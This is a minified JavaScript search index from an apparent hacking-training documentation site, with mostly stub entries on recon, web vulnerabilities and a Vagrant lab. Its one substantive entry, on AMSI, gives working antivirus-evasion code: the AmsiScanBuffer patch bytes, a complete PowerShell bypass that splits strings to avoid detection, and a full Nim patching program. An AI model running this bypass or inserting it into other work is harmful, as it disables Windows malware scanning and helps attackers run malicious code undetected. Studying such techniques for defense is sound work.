'use strict';(function(){const b={cache:!0};b.doc={id:'id',field:['title','content'],store:['title','href','section']};const a=FlexSearch.create('balance',b);window.bookSearchIndex=a,a.add({id:0,href:'/learn-hacking/docs/windows/evasion/',title:"Evasion",section:"Windows",content:"Evasion #  Evading anti-virus and EDR solutions comes in many forms, from simply patching functions to unhooking DLLs.\n"}),a.add({id:1,href:'/learn-hacking/docs/lab/',title:"Lab",section:"Docs",content:"Lab #  TODO Add link to vagrant install and usage docs.  Included with this set of learning is a lab environment using vagrant and packer.\nStarting the lab #  Starting the lab takes one command.\n$ vagrant up Not all of the lab needs to be started at the same time.\n$ vagrant up dc1 Stopping the lab #  Some or all machines can be stopped the same way\n$ vagrant halt [name] Cleaning up #  Use the following command to unregister the VMs from your system and free up some disk space.\n$ vagrant destroy "}),a.add({id:2,href:'/learn-hacking/docs/recon/',title:"Recon",section:"Docs",content:"Reconnaissance #  Reconnaissance, or \u0026ldquo;recon\u0026rdquo; for short, is a collection of techniques that can be run from a local attacker system, or a remote attacker controlled system.\n"}),a.add({id:3,href:'/learn-hacking/docs/web/',title:"Web",section:"Docs",content:"Web #  TODO Consider the following:\n https://owasp.org/www-project-top-ten/   "}),a.add({id:4,href:'/learn-hacking/docs/windows/evasion/amsi/',title:"AMSI",section:"Evasion",content:"AMSI #  This is the Windows AntiMalware Scan Interface. This is basically an interface for scanning file, processes, and more that can then be used by Windows Defender or other antivirus products.\nPatching AmsiScanBuffer #  It might be as easy as patching the AmsiScanBuffer function provided by amsi.dll to return false.\nThe basic process here is:\n Use LoadLibrary to read amsi.dll from disk into a known variable handle. Use GetProcAddress to identify the address of the AmsiScanBuffer function. Since amsi.dll should have already been loaded into the process at process start, this should be the address to the function already active in memory. Use VirtualProtect to make the memory containing the AmsiScanBuffer function writable (0x40 == PAGE_EXECUTE_READWRITE). Just copy over the byte code for a simple replacement function.  Replacement function:\nb8 57 00 07 80 mov eax,0x80070057 # AMSI_RESULT_CLEAN c3 ret This replacement function is just two asm calls that push AMSI_RESULT_CLEAN into eax and return. This makes any call to AmsiScanBuffer succeed as if the file was clean.\nPowershell #  In powershell, patching AmsiScanBuffer basically means calling out to a little C# code to do the heavy work of calling Win32 APIs to patch the function in the current process.\nExample # Credit: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsidll-amsiscanbuffer-by-rasta-mouse $Win32 = @\u0026#34; using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr LoadLibrary(string name); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \u0026#34;@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(\u0026#34;am\u0026#34; + \u0026#34;si.dll\u0026#34;) $Address = [Win32]::GetProcAddress($LoadLibrary, \u0026#34;Amsi\u0026#34; + \u0026#34;Scan\u0026#34; + \u0026#34;Buffer\u0026#34;) $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6) Source: amsi_powershell_rasta.ps1\n  References:\n https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/  Nim #  Example #[ Author: Marcello Salvati, Twitter: @byt3bl33d3r License: BSD 3-Clause Credit: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim ]# import winim/lean import strformat import dynlib when defined amd64: echo \u0026#34;[*] Running in x64 process\u0026#34; const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3] elif defined i386: echo \u0026#34;[*] Running in x86 process\u0026#34; const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00] proc PatchAmsi(): bool = var amsi: LibHandle cs: pointer op: DWORD t: DWORD disabled: bool = false # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything\u0026#39;s ok (which you can\u0026#39;t really do well when using LoadLibrary() directly through winim) amsi = loadLib(\u0026#34;amsi\u0026#34;) if isNil(amsi): echo \u0026#34;[X] Failed to load amsi.dll\u0026#34; return disabled cs = amsi.symAddr(\u0026#34;AmsiScanBuffer\u0026#34;) # equivalent of GetProcAddress() if isNil(cs): echo \u0026#34;[X] Failed to get the address of \u0026#39;AmsiScanBuffer\u0026#39;\u0026#34; return disabled if VirtualProtect(cs, patch.len, 0x40, addr op): echo \u0026#34;[*] Applying patch\u0026#34; copyMem(cs, unsafeAddr patch, patch.len) VirtualProtect(cs, patch.len, op, addr t) disabled = true return disabled when isMainModule: var success = PatchAmsi() echo fmt\u0026#34;[*] AMSI disabled: {bool(success)}\u0026#34; Source: amsi_nim_offensivenim.nim\n  References #   https://onlinedisassembler.com/odaweb/majaEeX0/0 https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants http://pinvoke.net/default.aspx/kernel32/VirtualProtect.html  "}),a.add({id:5,href:'/learn-hacking/docs/web/tools/burp/',title:"Burp",section:"Tools",content:"Burp #  TODO Fill this out\n \u0026ldquo;how would you typically set up intruder, what settings would you use etc\u0026rdquo;   Intruder #  "}),a.add({id:6,href:'/learn-hacking/docs/web/vulnerabilities/CSRF/',title:"CSRF",section:"Vulnerabilies",content:"Cross Site Request Forgery #  TODO Fill this out\n can you explain how you\u0026rsquo;d test for or exploit a csrf vulnerability with a password reset function in a page   "}),a.add({id:8,href:'/learn-hacking/docs/web/vulnerabilities/IDOR/',title:"IDOR",section:"Vulnerabilies",content:"Insecure Direct Object References #  TODO Fill this out  Oh, needs content I bet\n"}),a.add({id:9,href:'/learn-hacking/docs/linux/',title:"Linux",section:"Docs",content:"Linux #  "}),a.add({id:10,href:'/learn-hacking/docs/recon/tools/nmap/',title:"nmap",section:"Tools",content:"Network Mapper #  TODO Fill this out if you were to nmap scan a target what settings would you typically use (and what do the settings mean)  "}),a.add({id:11,href:'/learn-hacking/docs/web/vulnerabilities/sqli/',title:"SQLi",section:"Vulnerabilies",content:"SQL Injection #  TODO Fill this out\n also more generic but keep hearing it, can you explain what SQLi is (detailed) and the followup question of the ways to remediate/prevent it   "}),a.add({id:12,href:'/learn-hacking/docs/recon/tools/',title:"Tools",section:"Recon",content:"Tools #  "}),a.add({id:15,href:'/learn-hacking/docs/windows/',title:"Windows",section:"Docs",content:"Windows #  "}),a.add({id:16,href:'/learn-hacking/docs/web/vulnerabilities/xss/',title:"XSS",section:"Vulnerabilies",content:"Cross Site Scripting #  TODO Fill this out\n can you explain different types of xss and where you\u0026rsquo;d typically find them, followup question might by what types of xss evasion techniques have you used (example \u0026lt;script\u0026gt; etc)   "}),a.add({id:17,href:'/learn-hacking/docs/web/vulnerabilities/xxe/',title:"XXE",section:"Vulnerabilies",content:"XML External Entities #  TODO Fill this out can you explain what XXE is and how to do it/remediate - (DTDs etc)  "})})()